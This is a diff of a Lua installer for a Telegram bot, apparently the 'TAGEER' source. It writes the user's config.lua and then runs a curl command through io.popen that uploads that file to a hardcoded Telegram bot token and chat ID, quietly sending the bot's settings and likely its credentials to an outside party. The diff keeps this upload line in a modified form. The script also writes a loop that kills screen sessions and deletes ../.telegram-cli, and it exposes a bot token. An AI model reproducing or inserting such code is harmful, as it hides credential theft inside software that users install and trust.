@@ -52,12 +52,12 @@ bot_id = botid,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 267308044 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -T "chat_id='.. 267308044 ..'" -T "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("TA", "w")  file:write([[
 killall screen
 while(true) do
 rm -fr ../.telegram-cli
-screen ./tg -s TAGEER.lua
+screen ./RUNTA.sh
 done
 echo -e "TAGEER IS RUN BOT"
 ]])  file:close()  
